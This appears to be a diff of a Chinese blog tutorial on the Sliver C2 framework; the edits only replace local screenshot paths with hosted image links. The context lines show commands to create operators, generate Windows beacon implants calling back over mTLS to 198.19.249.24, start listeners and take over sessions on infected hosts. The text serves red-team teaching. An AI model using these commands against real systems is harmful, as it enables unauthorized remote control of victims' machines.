@@ -15,7 +15,7 @@ Sliver是一个开源的C2项目，用Golang开发。Sliver的操作与Metasploi
 
 sliver-server在root目录下，是服务端程序，如果要实现多用户操作，必须启动此程序，后续新建用户等操作都需要在此程序下操作`sudo /root/sliver-server` 。
 
-![Untitled](Sliver/Untitled.png)
+![Untitled](https://raw.githubusercontent.com/Ryze-T/blog_picture/main/202404260108002.png)
 
 用户端可以直接去github上下载对应架构的客户端https://github.com/BishopFox/sliver/releases。
 
@@ -23,17 +23,17 @@ sliver在终端模式下是具备自动补全功能的，因此可以多使用Ta
 
 # 多用户模式
 
-![Untitled](Sliver/Untitled%201.png)
+![Untitled](https://raw.githubusercontent.com/Ryze-T/blog_picture/main/202404260108864.png)
 
 在Server端中新建用户：`new-operator --name client -l 198.19.249.24 -p 20000` 
 
-![Untitled](Sliver/Untitled%202.png)
+![Untitled](https://raw.githubusercontent.com/Ryze-T/blog_picture/main/202404260108139.png)
 
 输入`multiplayer -l 20000` 启动指定端口的多用户模式。
 
 将配置文件复制到client机器的~/.sliver-client/configs目录中，再启动sliver-client。
 
-![Untitled](Sliver/Untitled%203.png)
+![Untitled](https://raw.githubusercontent.com/Ryze-T/blog_picture/main/202404260108615.png)
 
 # Beacons & Sessions
 
@@ -61,13 +61,13 @@ generate beacon --arch amd64 --os windows --mtls 198.19.249.24:3306 --save ./tes
 profiles new --mtls 198.19.249.24:3306 --os windows --arch amd64 --format exe windows_default
 ```
 
-![Untitled](Sliver/Untitled%204.png)
+![Untitled](https://raw.githubusercontent.com/Ryze-T/blog_picture/main/202404260108039.png)
 
 需要使用时执行`profiles generate --save ./test.exe  windows_default` 。
 
 输出`implants`可以看到所有生成的implant：
 
-![Untitled](Sliver/Untitled%205.png)
+![Untitled](https://raw.githubusercontent.com/Ryze-T/blog_picture/main/202404260108276.png)
 
 ## 监听
 
@@ -77,11 +77,11 @@ profiles new --mtls 198.19.249.24:3306 --os windows --arch amd64 --format exe wi
 mtls -l 3306
 ```
 
-![Untitled](Sliver/Untitled%206.png)
+![Untitled](https://raw.githubusercontent.com/Ryze-T/blog_picture/main/202404260108534.png)
 
 使用jobs可以看到当前开启的监听任务：
 
-![Untitled](Sliver/Untitled%207.png)
+![Untitled](https://raw.githubusercontent.com/Ryze-T/blog_picture/main/202404260108189.png)
 
 job1是sliver多用户模式下开启的grpc端口，用于多用户协同操作，job2就是刚刚开启的监听端口。
 
@@ -89,19 +89,19 @@ job1是sliver多用户模式下开启的grpc端口，用于多用户协同操作
 
 在受控主机上点击木马后，server端和client端都会接到消息：
 
-![Untitled](Sliver/Untitled%208.png)
+![Untitled](https://raw.githubusercontent.com/Ryze-T/blog_picture/main/202404260108052.png)
 
 输入`beacons`可以看到上线的beacon的信息：
 
-![Untitled](Sliver/Untitled%209.png)
+![Untitled](https://raw.githubusercontent.com/Ryze-T/blog_picture/main/202404260108892.png)
 
 `use`命令可以进入该beacon，进入后可以执行`interactive` 转换出一个session，由于需要等待休眠时间，所以需要等待一会儿。
 
-![Untitled](Sliver/Untitled%2010.png)
+![Untitled](https://raw.githubusercontent.com/Ryze-T/blog_picture/main/202404260108469.png)
 
 转换完成后再执行`sessions` 可以看到相关信息：
 
-![Untitled](Sliver/Untitled%2011.png)
+![Untitled](https://raw.githubusercontent.com/Ryze-T/blog_picture/main/202404260108397.png)
 
 `use`命令可以进入该session。
 
